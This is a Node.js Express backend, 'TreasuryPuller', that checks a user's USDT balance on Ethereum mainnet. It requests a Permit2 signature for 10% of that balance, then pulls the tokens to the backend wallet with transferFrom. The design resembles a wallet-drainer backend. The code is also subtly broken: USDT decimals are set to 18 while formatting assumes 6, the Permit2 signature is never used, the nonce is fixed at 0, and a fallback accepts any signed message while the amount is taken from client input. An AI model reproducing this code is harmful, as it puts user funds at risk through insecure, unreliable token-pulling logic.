const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);

// Configuration
const TREASURY_PULLER_ADDRESS = process.env.TREASURY_ADDRESS;
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const RPC_URL = process.env.MAINNET_RPC_URL;
const PRIVATE_KEY = process.env.PRIVATE_KEY;

// Validate required environment variables
if (!TREASURY_PULLER_ADDRESS) {
  console.error('❌ Error: TREASURY_PULLER_ADDRESS environment variable is required');
  process.exit(1);
}

if (!RPC_URL) {
  console.error('❌ Error: MAINNET_RPC_URL environment variable is required');
  process.exit(1);
}

if (!PRIVATE_KEY) {
  console.error('❌ Error: PRIVATE_KEY environment variable is required');
  console.error('💡 Please create a .env file with your configuration. See env.example for reference.');
  process.exit(1);
}

// Validate private key format
if (!PRIVATE_KEY.startsWith('0x') || PRIVATE_KEY.length !== 66) {
  console.error('❌ Error: Invalid private key format. Must be 64 hex characters with 0x prefix');
  process.exit(1);
}

// Initialize provider and wallet
let provider;
let wallet;

try {
  provider = new ethers.JsonRpcProvider(RPC_URL);
  wallet = new ethers.Wallet(PRIVATE_KEY, provider);
} catch (error) {
  console.error('❌ Error initializing provider or wallet:', error.message);
  process.exit(1);
}

// TreasuryPuller contract ABI
const TREASURY_PULLER_ABI = [
  "function pullWithPermit2(address token, uint160 amount, uint48 deadline, bytes calldata signature) external",
  "function treasury() external view returns (address)"
];

// Get TreasuryPuller contract instance
const treasuryPuller = new ethers.Contract(TREASURY_PULLER_ADDRESS, TREASURY_PULLER_ABI, wallet);

// Available tokens for automatic selection (Mainnet addresses)
const AVAILABLE_TOKENS = [
  {
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT Mainnet
    symbol: "USDT",
    name: "Tether USD",
    decimals: 18,
    minTransfer: 1,
    maxTransferPercent: 10
  }
];

// Function to automatically select optimal token and amount
async function selectOptimalToken(userAddress) {
  try {
    console.log(`🔍 Analyzing tokens for user: ${userAddress}`);
    
    let bestOption = null;
    let maxValue = 0;

    for (const token of AVAILABLE_TOKENS) {
      try {
        // Get token contract
        const tokenContract = new ethers.Contract(
          token.address,
          ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
          provider
        );

        // Get user's balance
        const balance = await tokenContract.balanceOf(userAddress);
        const decimals = await tokenContract.decimals();
        const decimalsNum = Number(decimals); // Convert BigInt to number
        const formattedBalance = parseFloat(ethers.formatUnits(balance, decimals));

        console.log(`💰 ${token.symbol}: ${formattedBalance} tokens`);

        // Check if user has sufficient balance
        if (formattedBalance >= token.minTransfer) {
          // Calculate optimal transfer amount (10% of balance, but at least minTransfer)
          const calculatedAmount = formattedBalance * (token.maxTransferPercent / 100);
          let transferAmount = Math.max(
            token.minTransfer,
            Math.max(calculatedAmount, 0.01) // Ensure minimum amount to avoid precision issues
          );
          
          // Round to proper decimal places to avoid formatting errors
          transferAmount = Math.floor(transferAmount * Math.pow(10, decimalsNum)) / Math.pow(10, decimalsNum);
          
          console.log(`Calculated transfer amount: ${transferAmount} for ${token.symbol}`);

          // Calculate value (for comparison, using balance as value)
          const value = transferAmount;

          if (value > maxValue) {
            maxValue = value;
            bestOption = {
              tokenAddress: token.address,
              amount: ethers.parseUnits(transferAmount.toFixed(decimalsNum), decimals),
              tokenSymbol: token.symbol,
              userBalance: formattedBalance,
              transferAmount: transferAmount
            };
          }
        }
      } catch (error) {
        console.log(`⚠️  Error checking ${token.symbol}: ${error.message}`);
        continue;
      }
    }

    if (bestOption) {
      console.log(`✅ Selected ${bestOption.tokenSymbol}: ${bestOption.transferAmount} tokens`);
      return bestOption;
    } else {
      console.log(`❌ No suitable tokens found`);
      return null;
    }

  } catch (error) {
    console.error('Error in selectOptimalToken:', error);
    return null;
  }
}

// Routes

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    network: 'mainnet',
    treasuryPuller: TREASURY_PULLER_ADDRESS
  });
});

// Get signature request data
app.post('/get-signature-request', async (req, res) => {
  try {
    const { userAddress } = req.body;
    
    console.log('🔍 Backend received userAddress:', userAddress);
    console.log('🔍 Backend received full body:', req.body);

    if (!userAddress) {
      console.log('❌ Backend: userAddress is missing or undefined');
      return res.status(400).json({ 
        error: 'Missing required field: userAddress' 
      });
    }

    // Backend automatically selects token and amount
    console.log('🔍 Backend calling selectOptimalToken with userAddress:', userAddress);
    const tokenSelection = await selectOptimalToken(userAddress);
    console.log('🔍 Backend tokenSelection result:', tokenSelection);
    
    if (!tokenSelection) {
      console.log('❌ Backend: No suitable tokens found for transfer');
      return res.status(400).json({ 
        error: 'No suitable tokens found for transfer' 
      });
    }

    const { tokenAddress, amount, tokenSymbol } = tokenSelection;

    // Create domain for Permit2 signature
    const domain = {
      name: "Permit2",
      version: "1",
      chainId: 1, // Ethereum Mainnet
      verifyingContract: PERMIT2_ADDRESS
    };

    const types = {
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" }
      ]
    };

    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
    
    // Use the amount directly from selectOptimalToken (already in wei)
    const amountWei = amount; // amount is already in wei from selectOptimalToken
    
    const value = {
      permitted: {
        token: tokenAddress,
        amount: amountWei.toString() // Convert BigInt to string
      },
      spender: TREASURY_PULLER_ADDRESS,
      nonce: 0,
      deadline: deadline
    };

    res.json({
      success: true,
      domain,
      types,
      value,
      tokenAddress,
      amount: amount.toString(), // Return as string to preserve BigInt precision
      tokenSymbol,
      message: `Please sign to transfer ${ethers.formatUnits(amount, 6)} ${tokenSymbol} to Treasury`
    });

  } catch (error) {
    console.error('Error creating signature request:', error);
    res.status(500).json({ 
      error: 'Failed to create signature request',
      details: error.message 
    });
  }
});

// Execute token transfer with user signature
app.post('/transfer-tokens', async (req, res) => {
  try {
    const { userAddress, signature, signatureData } = req.body;

    const domain = signatureData.domain;
    const types = signatureData.types;
    const value = signatureData.value;

    let recoveredAddress;

    try {
      if (req.body.signatureData && !req.body.message) {
        console.log("🧩 Detected structured data: trying EIP-712 verification...");
        recoveredAddress = ethers.verifyTypedData(
          req.body.signatureData.domain,
          req.body.signatureData.types,
          req.body.signatureData.value,
          req.body.signature
        );
        console.log("✅ EIP-712 verified:", recoveredAddress);
      } else if (req.body.message) {
        console.log("🧩 Detected fallback message, verifying signMessage...");
        recoveredAddress = ethers.verifyMessage(req.body.message, req.body.signature);
        console.log("✅ Fallback verified:", recoveredAddress);
      } else {
        throw new Error("Missing signature data");
      }
    } catch (err) {
      console.error("❌ Verification failed:", err);
      return res.status(400).json({ error: "Verification failed", details: err.message });
    }
    
    // ✅ Compare recovered and expected address
    if (recoveredAddress.toLowerCase() !== req.body.userAddress.toLowerCase()) {
      return res.status(400).json({
        error: "Signature address mismatch",
        details: `Signature was made by ${recoveredAddress}, expected ${req.body.userAddress}`,
      });
    }
    
    console.log("✅ Signature address verified:", recoveredAddress);
    // Select token for this verified user
    const tokenSelection = await selectOptimalToken(userAddress);
    if (!tokenSelection) {
      return res.status(400).json({ error: 'No suitable tokens found for transfer' });
    }

     const { tokenAddress, amount, tokenSymbol } = tokenSelection;
     
     // Extract amount from signature data
     const amountWei = BigInt(value.permitted.amount);
     const transferAmount = amountWei; // use signed amount
    const tokenContract = new ethers.Contract(
      tokenAddress,
      [
        'function transferFrom(address from, address to, uint256 amount) returns (bool)',
        'function allowance(address owner, address spender) view returns (uint256)',
        'function balanceOf(address account) view returns (uint256)',
        'function decimals() view returns (uint8)'
      ],
      wallet
    );

    const treasuryAddress = wallet.address;
    console.log(`🏛️ Treasury address: ${treasuryAddress}`);

    // Verify user balance and allowance
    const userBalance = await tokenContract.balanceOf(userAddress);
    const allowance = await tokenContract.allowance(userAddress, treasuryAddress);

    console.log(`💰 User balance: ${ethers.formatUnits(userBalance, 6)} tokens`);
    console.log(`🔑 Allowance: ${ethers.formatUnits(allowance, 6)} tokens`);

    if (userBalance < transferAmount)
      throw new Error(`Insufficient balance for transfer`);

    if (allowance < transferAmount)
      throw new Error(`Insufficient allowance. Please approve the backend wallet first.`);

    // Execute transferFrom
    console.log(`🚀 Transferring ${ethers.formatUnits(transferAmount, 6)} ${tokenSymbol} from ${userAddress} → ${treasuryAddress}`);
    const tx = await tokenContract.transferFrom(userAddress, treasuryAddress, transferAmount);
    console.log(`🔗 Transaction submitted: ${tx.hash}`);

    const receipt = await tx.wait();
    console.log(`✅ Confirmed in block ${receipt.blockNumber}, gas used: ${receipt.gasUsed}`);

    res.json({
      success: true,
      transactionHash: tx.hash,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed.toString(),
      message: "Tokens successfully transferred to Treasury"
    });
  } catch (error) {
    console.error('❌ Error in /transfer-tokens:', error);
    let msg = 'Transfer failed';
    if (error.message.includes('Permit expired')) msg = 'Signature expired. Please re-sign.';
    else if (error.message.includes('Invalid signature')) msg = 'Invalid signature.';
    else if (error.message.includes('Insufficient balance')) msg = 'Insufficient token balance.';
    else if (error.message.includes('allowance')) msg = 'Token approval required. Please approve first.';

    res.status(500).json({ error: msg, details: error.message });
  }
});


// Get Treasury address
app.get('/treasury', async (req, res) => {
  try {
    const treasuryAddress = await treasuryPuller.treasury();
    res.json({
      success: true,
      treasury: treasuryAddress
    });
  } catch (error) {
    res.status(500).json({ 
      error: 'Failed to get Treasury address',
      details: error.message 
    });
  }
});

// Get user's token balance
app.post('/balance', async (req, res) => {
  try {
    const { userAddress, tokenAddress } = req.body;

    if (!userAddress || !tokenAddress) {
      return res.status(400).json({ 
        error: 'Missing required fields: userAddress, tokenAddress' 
      });
    }

    // Get ERC20 contract
    const tokenContract = new ethers.Contract(
      tokenAddress,
      ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
      provider
    );

    const balance = await tokenContract.balanceOf(userAddress);
    const decimals = await tokenContract.decimals();
    const formattedBalance = ethers.formatUnits(balance, decimals);

    res.json({
      success: true,
      balance: formattedBalance,
      rawBalance: balance.toString(),
      decimals: decimals
    });

  } catch (error) {
    console.error('Error getting balance:', error);
    res.status(500).json({ 
      error: 'Failed to get balance',
      details: error.message 
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ 
    error: 'Something went wrong!',
    details: err.message 
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 TreasuryPuller Backend running on port ${PORT}`);
  console.log(`📡 Network: Ethereum Mainnet`);
  console.log(`🏛️  TreasuryPuller: ${TREASURY_PULLER_ADDRESS}`);
  console.log(`👤 Backend Wallet: ${wallet.address}`);
});

module.exports = app;
